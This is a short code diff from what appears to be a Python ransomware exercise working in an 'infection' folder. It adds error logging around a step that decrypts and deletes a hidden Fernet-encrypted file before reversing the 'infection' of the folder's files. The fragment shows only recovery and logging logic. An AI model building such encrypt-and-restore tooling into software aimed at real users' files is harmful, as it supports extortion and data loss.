@@ -18,8 +18,8 @@ def logging (exception, need_print):
     date = str(date)
     if need_print == 1:
         print("Log file writing")
-    f.write('\n%s: ' % date)
-    f.write(' Error -> %s' % exception)
+    f.write('%s: ' % date)
+    f.write(' Error -> %s \n' % exception)
     f.close()
 
 def ft_server_part(need_print):
@@ -51,11 +51,15 @@ def ft_server_part(need_print):
         os._exit(os.EX_OK)
     # print(plaintext)
     key = Fernet(plaintext)
-    not_enc_file = open(home + "/infection/.not_encoded.ft", "rb")
-    not_enc_text = key.decrypt(not_enc_file.read())
-    not_enc_file.close()
-    os.remove(home + "/infection/.not_encoded.ft")
-    not_enc_text = not_enc_text.decode("utf-8")
+    try:
+        not_enc_file = open(home + "/infection/.not_encoded.ft", "rb")
+        not_enc_text = key.decrypt(not_enc_file.read())
+        not_enc_file.close()
+        os.remove(home + "/infection/.not_encoded.ft")
+        not_enc_text = not_enc_text.decode("utf-8")
+    except Exception as e:
+        logging(e, need_print)
+        os._exit(os.EX_OK)
     # print(not_enc_text)
     will_rev_infect = list (filter(os.path.isfile, os.listdir(".")))
     for file in will_rev_infect:
